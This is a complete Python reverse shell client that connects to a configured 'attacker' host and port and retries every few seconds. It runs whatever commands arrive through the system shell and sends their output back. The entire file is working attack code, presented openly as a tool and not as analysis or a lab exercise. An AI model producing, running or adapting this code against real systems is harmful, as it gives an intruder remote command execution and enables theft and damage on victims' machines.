import socket
import subprocess
import os
import time
import threading

# Configuration
HOST = '127.0.0.1'  # Attacker's IP
PORT = 4444  # Attacker's port
RECONNECT_DELAY = 5  # Seconds between connection attempts


class ReverseShell:
    def __init__(self):
        self.sock = None
        self.running = True
        self.platform = os.name

    def connect(self):
        """Establish reverse connection"""
        while self.running:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((HOST, PORT))
                print(f"[*] Connected to {HOST}:{PORT}")
                return True
            except Exception as e:
                print(f"[!] Connection failed: {str(e)}")
                time.sleep(RECONNECT_DELAY)
        return False

    def receive_commands(self):
        """Receive and execute commands from server"""
        try:
            while self.running:
                # Receive command from attacker
                command = self.sock.recv(1024).decode().strip()
                if not command:
                    break

                # Handle special commands
                if command.lower() == 'exit':
                    self.running = False
                    break

                # Execute command
                output = self.execute_command(command)

                # Send output back
                self.sock.sendall(output.encode())
        except Exception as e:
            print(f"[!] Error: {str(e)}")
        finally:
            self.sock.close()
            if self.running:
                print("[*] Connection lost, attempting reconnect...")
                self.main_loop()

    def execute_command(self, command):
        """Execute system command and return output"""
        try:
            # Select appropriate shell
            shell = True if self.platform == 'nt' else False
            if self.platform == 'posix':
                command = ['/bin/sh', '-c', command]

            # Execute command
            result = subprocess.Popen(
                command,
                shell=shell,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                stdin=subprocess.PIPE
            )

            # Get output
            stdout, stderr = result.communicate()
            output = stdout.decode() + stderr.decode()

            # If no output, return command echo
            return output if output else f"Command executed: {command}"
        except Exception as e:
            return str(e)

    def main_loop(self):
        """Main connection handler"""
        if self.connect():
            self.receive_commands()

    def start(self):
        """Start reverse shell"""
        print(f"Starting reverse shell to {HOST}:{PORT}...")
        while self.running:
            try:
                self.main_loop()
            except KeyboardInterrupt:
                print("\n[*] User interrupted")
                self.running = False
            except Exception as e:
                print(f"[!] Critical error: {str(e)}")
                time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    rs = ReverseShell()
    rs.start()